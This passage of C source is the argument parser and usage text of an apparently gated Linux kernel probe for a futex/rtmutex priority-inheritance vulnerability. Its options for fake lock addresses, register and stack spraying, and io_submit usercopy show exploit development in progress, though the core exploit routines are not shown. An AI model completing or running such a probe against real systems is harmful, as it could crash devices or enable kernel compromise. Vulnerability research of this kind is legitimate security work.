            "[--waiter-churn=none|syscall|stack|stackshape|regspray|regsprayclean|fd|mix|memfd|pipe|epoll|unix|slotsearch|slotsearchlast|slotreadlinklast|slotfutexwaithold|slotsendmsghold|frameprobe|pressure] "
            "[--quiet-waiter-churn] "
            "[--stackshape-case=full|readlink|readstatus|unixdgram|nanosleep|gettid|clock|yield|readlink-readstatus|readstatus-unixdgram|readlink-readstatus-unixdgram|unix-nanosleep|nanosleep8|readstatus-nanosleep8|unixdgram-nanosleep8|readstatus-unixdgram-nanosleep8|full-no-readlink|full-no-tail|full-no-nanosleep|tag-readstatus|tag-unixdgram|tag-readstatus-nanosleep8|tag-unixdgram-nanosleep8|tag-readstatus-unixdgram-nanosleep8|stacktag-full|stacktag-readstatus|stacktag-unixdgram|stacktag-readstatus-unixdgram|stacktag-readstatus-nanosleep8|stacktag-unixdgram-nanosleep8|stacktag-readstatus-unixdgram-nanosleep8] "
            "[--frameprobe-case=readlink|clock|nanosleep|futexwake|futexwait|futexwait-args|read|write|readv|writev|ioctl-fionread|sendmsg|recvmsg|sendmsg-block|ppoll|prctl-name] "
            "[--regspray-value=U64] [--stacktag-value=U64] "
            "[--churn-iterations=N] [--churn-keep-fds=N] "
            "[--process-vm-mb=N] "
            "[--churn-progress=each|final|none] "
            "[--stack-marker-telemetry=N] "
            "[--chainwalk-at-churn-iter=N] [--chainwalk-after-churn] "
            "[--watchdog-sec=N]\n"
            "\n"
            "This probe is intentionally gated. The idle stage reaches the\n"
            "EDEADLK rollback path and waits without issuing the final main\n"
            "FUTEX_LOCK_PI(cycle_futex). The waiter-exit stage joins the waiter\n"
            "thread before issuing that final main-thread call. The chainwalk\n"
            "stage issues the final call while the waiter is still alive. All\n"
            "modes have no payload and no fake waiter. Optional waiter churn is\n"
            "post-return syscall/FD/kernel-stack-use telemetry, not proof of\n"
            "stack reclaim. The\n"
            "probe manipulates vulnerable futex/rtmutex state and may panic or\n"
            "reboot a vulnerable test device.\n",
            argv0, argv0, argv0);
}

int main(int argc, char **argv)
{
    if (argc >= 3 &&
        (strcmp(argv[1], "--stage-chainwalk") == 0 ||
         strcmp(argv[1], "--stage-edeadlk-idle") == 0 ||
         strcmp(argv[1], "--stage-waiter-exit-chainwalk") == 0) &&
        strcmp(argv[2], "--i-understand-this-may-panic") == 0) {
        int run_idle = strcmp(argv[1], "--stage-edeadlk-idle") == 0;
        int run_waiter_exit =
            strcmp(argv[1], "--stage-waiter-exit-chainwalk") == 0;
        for (int i = 3; i < argc; i++) {
            long value;
            uint64_t value_u64;
            if (parse_long_arg(argv[i], "--waiter-timeout-ms=", &waiter_timeout_ms)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--hold-ms=", &waiter_hold_ms)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--idle-ms=", &idle_after_edeadlk_ms)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--post-exit-delay-ms=", &post_waiter_exit_delay_ms)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--pre-chainwalk-delay-ms=", &value)) {
                if (value > LONG_MAX / 1000) {
                    fprintf(stderr, "pre-chainwalk delay overflow: %s\n", argv[i]);
                    return 2;
                }
                pre_chainwalk_delay_ms = value;
                pre_chainwalk_delay_us = value * 1000;
                continue;
            }
            if (parse_long_arg(argv[i], "--pre-chainwalk-delay-us=", &value)) {
                pre_chainwalk_delay_us = value;
                pre_chainwalk_delay_ms = value / 1000;
                continue;
            }
            if (parse_long_arg(argv[i], "--watchdog-sec=", &watchdog_sec)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--adjust-pi-repeats=", &waiter_adjust_pi_repeats)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--churn-iterations=", &waiter_churn_iterations)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--churn-keep-fds=", &waiter_churn_keep_fds)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--process-vm-mb=", &process_vm_mb)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--chainwalk-at-churn-iter=", &chainwalk_at_churn_iter)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--chainwalk-raw-timeout-ms=", &chainwalk_raw_timeout_ms)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--stack-marker-telemetry=", &stack_marker_telemetry_limit)) {
                continue;
            }
            if (parse_long_arg(argv[i], "--cycle-futex-offset=", &cycle_futex_offset)) {
                continue;
            }
            if (parse_u64_arg(argv[i], "--regspray-value=", &regspray_value)) {
                continue;
            }
            if (parse_u64_arg(argv[i], "--stacktag-value=", &stacktag_value)) {
                continue;
            }
            if (parse_u64_arg(argv[i], "--chainwalk-raw-val3=", &chainwalk_raw_val3)) {
                continue;
            }
            if (parse_u64_arg(argv[i], "--io-submit-word0=", &io_submit_word0) ||
                parse_u64_arg(argv[i], "--io-submit-task=", &io_submit_word0)) {
                io_submit_word0_set = 1;
                continue;
            }
            if (parse_u64_arg(argv[i], "--io-submit-word1=", &io_submit_word1) ||
                parse_u64_arg(argv[i], "--io-submit-lock=", &io_submit_word1)) {
                io_submit_word1_set = 1;
                continue;
            }
            if (parse_u64_arg(argv[i], "--io-submit-opcode=", &value_u64)) {
                if (value_u64 > UINT16_MAX) {
                    fprintf(stderr, "io-submit opcode out of uint16 range: %s\n", argv[i]);
                    return 2;
                }
                io_submit_opcode = (long)value_u64;
                continue;
            }
            if (parse_signed_long_arg(argv[i], "--io-submit-reqprio=", &value)) {
                if (value < INT16_MIN || value > INT16_MAX) {
                    fprintf(stderr, "io-submit reqprio out of int16 range: %s\n", argv[i]);
                    return 2;
                }
                io_submit_reqprio = value;
                continue;
            }
            if (parse_signed_long_arg(argv[i], "--io-submit-fd=", &value)) {
                if (value < INT32_MIN || value > INT32_MAX) {
                    fprintf(stderr, "io-submit fd out of int32 range: %s\n", argv[i]);
                    return 2;
                }
                io_submit_fd = value;
                continue;
            }
            if (parse_u64_arg(argv[i], "--fixed-fake-lock-addr=", &value_u64)) {
                fixed_fake_lock_addr = value_u64;
                continue;
            }
            if (parse_u64_arg(argv[i], "--cycle-futex-fixed-addr=", &value_u64)) {
                cycle_futex_fixed_addr = (uintptr_t)value_u64;
                continue;
            }
            if (strncmp(argv[i], "--waiter-churn=", strlen("--waiter-churn=")) == 0) {
                waiter_churn_mode = argv[i] + strlen("--waiter-churn=");
                continue;
            }
            if (strncmp(argv[i], "--stackshape-case=", strlen("--stackshape-case=")) == 0) {
                stackshape_case = argv[i] + strlen("--stackshape-case=");
                continue;
            }
            if (strncmp(argv[i], "--frameprobe-case=", strlen("--frameprobe-case=")) == 0) {
                frameprobe_case = argv[i] + strlen("--frameprobe-case=");
                continue;
            }
            if (strncmp(argv[i], "--main-final-shape=", strlen("--main-final-shape=")) == 0) {
                main_final_shape = argv[i] + strlen("--main-final-shape=");
                continue;
            }
            if (strncmp(argv[i], "--cycle-futex-mode=", strlen("--cycle-futex-mode=")) == 0) {
                cycle_futex_mode = argv[i] + strlen("--cycle-futex-mode=");
                continue;
            }
            if (strncmp(argv[i], "--waiter-post-return=", strlen("--waiter-post-return=")) == 0) {
                waiter_post_return_mode = argv[i] + strlen("--waiter-post-return=");
                continue;
            }
            if (strncmp(argv[i], "--waiter-isolated-hold=", strlen("--waiter-isolated-hold=")) == 0) {
                waiter_isolated_hold_mode = argv[i] + strlen("--waiter-isolated-hold=");
                continue;
            }
            if (strncmp(argv[i], "--churn-progress=", strlen("--churn-progress=")) == 0) {
                const char *mode = argv[i] + strlen("--churn-progress=");
                if (strcmp(mode, "each") == 0) {
                    waiter_churn_progress_mode = 1;
                } else if (strcmp(mode, "final") == 0) {
                    waiter_churn_progress_mode = 0;
                } else if (strcmp(mode, "none") == 0) {
                    waiter_churn_progress_mode = -1;
                } else {
                    fprintf(stderr, "invalid churn progress mode: %s\n", mode);
                    return 2;
                }
                continue;
            }
            if (strcmp(argv[i], "--chainwalk-after-churn") == 0) {
                chainwalk_after_churn = 1;
                continue;
            }
            if (strcmp(argv[i], "--waiter-adjust-pi-after-post-return") == 0) {
                waiter_adjust_pi_after_post_return = 1;
                continue;
            }
            if (strcmp(argv[i], "--adjust-pi-start-isolated-hold") == 0) {
                adjust_pi_start_isolated_hold = 1;
                continue;
            }
            if (strcmp(argv[i], "--chainwalk-raw-final") == 0) {
                chainwalk_raw_final = 1;
                continue;
            }
            if (strcmp(argv[i], "--quiet-final") == 0) {
                quiet_final = 1;
                continue;
            }
            if (strcmp(argv[i], "--quiet-waiter-churn") == 0) {
                quiet_waiter_churn = 1;
                continue;
            }
            if (strcmp(argv[i], "--map-fixed-fake-lock") == 0) {
                map_fixed_fake_lock = 1;
                continue;
            }
            if (strcmp(argv[i], "--reuse-fixed-fake-lock-vma") == 0) {
                map_fixed_fake_lock = 1;
                reuse_fixed_fake_lock_vma = 1;
                continue;
            }
            usage(argv[0]);
            return 2;
        }

        if (waiter_timeout_ms < 100 ||
            waiter_hold_ms > 5000 ||
            idle_after_edeadlk_ms > 30000 ||
            post_waiter_exit_delay_ms > 5000 ||
            pre_chainwalk_delay_us > 5000000 ||
            waiter_churn_iterations > 10000 ||
            waiter_churn_keep_fds > 512 ||
            process_vm_mb < 1 ||
            process_vm_mb > 256 ||
            chainwalk_at_churn_iter > 10000 ||
            chainwalk_raw_timeout_ms > 30000 ||
            stack_marker_telemetry_limit > 16 ||
            waiter_adjust_pi_repeats < 1 ||
            waiter_adjust_pi_repeats > 64 ||
            watchdog_sec > 60) {
            fprintf(stderr, "argument out of allowed range\n");
            return 2;
        }
        if (!waiter_churn_mode_valid()) {
            fprintf(stderr, "invalid waiter churn mode: %s\n", waiter_churn_mode);
            return 2;
        }
        if (fixed_fake_lock_addr == 0 ||
            (map_fixed_fake_lock &&
             (fixed_fake_lock_addr & (FIXED_FAKE_LOCK_LEN - 1)) != 0)) {
            fprintf(stderr,
                    "fixed-fake-lock-addr must be nonzero and page aligned when mapped\n");
            return 2;
        }
        if (!stackshape_case_valid()) {
            fprintf(stderr, "invalid stackshape case: %s\n", stackshape_case);
            return 2;
        }
        if (!waiter_churn_mode_is("stack") &&
            !waiter_churn_mode_is("stackshape") &&
            strcmp(stackshape_case, "full") != 0) {
            fprintf(stderr,
                    "stackshape-case is only meaningful with --waiter-churn=stack or stackshape\n");
            return 2;
        }
        if (!frameprobe_case_valid()) {
            fprintf(stderr, "invalid frameprobe case: %s\n", frameprobe_case);
            return 2;
        }
        if (!main_final_shape_valid()) {
            fprintf(stderr, "invalid main final shape: %s\n", main_final_shape);
            return 2;
        }
        if (!cycle_futex_mode_valid()) {
            fprintf(stderr, "invalid cycle futex mode: %s\n", cycle_futex_mode);
            return 2;
        }
        if (!waiter_churn_mode_is("frameprobe") &&
            strcmp(frameprobe_case, "readlink") != 0) {
            fprintf(stderr,
                    "frameprobe-case is only meaningful with --waiter-churn=frameprobe\n");
            return 2;
        }
        if (!waiter_post_return_mode_valid()) {
            fprintf(stderr, "invalid waiter post-return mode: %s\n",
                    waiter_post_return_mode);
            return 2;
        }
        if (!waiter_isolated_hold_mode_valid()) {
            fprintf(stderr, "invalid waiter isolated-hold mode: %s\n",
                    waiter_isolated_hold_mode);
            return 2;
        }
        if (waiter_post_return_isolated() &&
            (!waiter_churn_mode_is("none") || waiter_churn_iterations > 0)) {
            fprintf(stderr,
                    "isolated waiter post-return modes require no waiter churn; they test one post-return effect at a time\n");
            return 2;
        }
        if (!waiter_post_return_isolated() &&
            !waiter_isolated_hold_mode_is("busy")) {
            fprintf(stderr,
                    "waiter-isolated-hold is only meaningful with isolated waiter post-return modes\n");
            return 2;
        }
        if (waiter_isolated_hold_mode_is("seccompgetppid") &&
            !waiter_post_return_mode_is("seccomperrno") &&
            !waiter_post_return_mode_is("io-submit-usercopy")) {
            fprintf(stderr,
                    "seccompgetppid hold requires --waiter-post-return=seccomperrno or io-submit-usercopy\n");
            return 2;
        }
        if (waiter_isolated_hold_mode_is("seccompgetppidlog") &&
            !waiter_post_return_mode_is("seccomplog") &&
            !waiter_post_return_mode_is("io-submit-usercopy")) {
            fprintf(stderr,
                    "seccompgetppidlog hold requires --waiter-post-return=seccomplog or io-submit-usercopy\n");
            return 2;
        }
        if (waiter_isolated_hold_mode_is("seccompgetppidallowmark") &&
            !waiter_post_return_mode_is("seccompallowmark") &&
            !waiter_post_return_mode_is("io-submit-usercopy")) {
            fprintf(stderr,
                    "seccompgetppidallowmark hold requires --waiter-post-return=seccompallowmark or io-submit-usercopy\n");
            return 2;
        }
        if (chainwalk_at_churn_iter > 0 &&
            (waiter_churn_iterations <= 0 ||
             waiter_churn_mode_is("none") ||
             waiter_churn_progress_mode <= 0 ||
             chainwalk_at_churn_iter > waiter_churn_iterations)) {
            fprintf(stderr,
                    "chainwalk-at-churn-iter requires active per-iteration progress churn and must be <= churn-iterations\n");
            return 2;
        }
        if (stack_marker_telemetry_limit > 0 &&
            (!(waiter_churn_mode_is("stack") ||
               waiter_churn_mode_is("stackshape")) ||
             waiter_churn_iterations <= 0)) {
            fprintf(stderr,
                    "stack-marker-telemetry requires --waiter-churn=stack or stackshape and --churn-iterations=N\n");
            return 2;
        }

        if (setup_cycle_futex_storage() != 0) {
            return 2;
        }
        print_env();
        if (map_fixed_fake_lock &&
            setup_fixed_fake_lock_mapping() != 0) {
            fprintf(stderr, "failed to map fixed fake lock\n");
            return 2;
        }
        if (run_idle) {
            return run_stage_edeadlk_idle();
        }
        if (run_waiter_exit) {
            return run_stage_waiter_exit_chainwalk();
        }
        return run_stage_chainwalk();
    }

    usage(argv[0]);
    return 2;
}
